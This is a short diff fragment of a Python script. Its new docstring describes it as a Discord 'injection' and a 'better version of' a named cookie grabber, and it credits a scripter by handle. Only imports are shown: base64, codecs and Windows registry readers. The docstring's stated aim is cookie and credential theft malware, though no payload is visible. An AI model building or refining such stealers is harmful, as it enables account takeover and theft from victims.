@@ -1,4 +1,8 @@
-# tutorial : https://pastebin.com/raw/BcpKHKvQ
+"""
+ Scripter : Mani.#0001
+ Injection : Bingo Methods discord
+ Better version of : vesper cookie grabber
+"""
 try:
     import base64, codecs
     from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
